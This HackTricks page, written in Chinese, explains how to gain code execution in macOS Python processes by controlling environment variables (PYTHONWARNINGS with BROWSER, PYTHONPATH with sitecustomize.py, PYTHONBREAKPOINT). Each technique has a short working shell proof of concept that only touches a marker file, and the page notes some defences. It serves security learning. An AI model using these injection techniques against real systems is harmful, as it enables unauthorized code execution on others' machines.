# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## 通过 `PYTHONWARNINGS` 和 `BROWSER` 环境变量

如果攻击者可以控制 Python 进程的环境，那么当 Python 在处理构造的 warning 选项时导入 `antigravity` 模块，`PYTHONWARNINGS` 和 `BROWSER` 的组合可以触发 command execution。该技术依赖于 `antigravity` 使用 Python 的 `webbrowser` 模块打开 URL，而该模块会遵循 `BROWSER` 环境变量。<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## 通过 `PYTHONPATH` 和 `sitecustomize.py`

在正常启动期间，Python 的 `site` module 会添加特定于 site 的路径，然后尝试导入名为 `sitecustomize` 的 module。通过将攻击者可控制的目录置于 `PYTHONPATH` 的首位，能够控制 process environment 的攻击者可以让 Python 在目标 script 之前导入 payload。`-S` flag 会禁用自动的 `site` initialization，而 isolated mode（`-I`）会忽略 `PYTHONPATH`，并隐含 `-s` 和 `-E`。<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## 通过 `PYTHONBREAKPOINT`

从 Python 3.7（PEP 553）开始，内置的 `breakpoint()` 会导入并调用 `sys.breakpointhook` 所指向的内容，而该目标取自 **`PYTHONBREAKPOINT`** 环境变量（`package.module.callable`）。导入指定模块和调用该 callable 都会在调试器通常出现之前执行，因此，能够控制某个会执行 `breakpoint()` 的进程环境的攻击者（这在维护/调试脚本中很常见，有时也会遗留在生产路径中）即可获得代码执行能力。<sup>[[4]](#references)</sup>
```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```
与 `PYTHONWARNINGS`/`PYTHONPATH` 不同，这要求目标实际执行到 `breakpoint()` 调用，但它也可以完全通过指定模块的 **import side effects** 工作（将其指向任意可 import 的模块——例如将某个模块放在 `PYTHONPATH` 的首位——其顶层代码会运行）。设置 `PYTHONBREAKPOINT=0` 可完全禁用该 hook。

## References

- [1] [使用 Environment Variables 进行 Hacking - elttam](https://www.elttam.com/blog/env/)
- [2] [site — 特定于 Site 的配置 hook](https://docs.python.org/3/library/site.html)
- [3] [Python 命令行与 Environment](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — 内置 breakpoint() 与 PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
{{#include ../../../banners/hacktricks-training.md}}
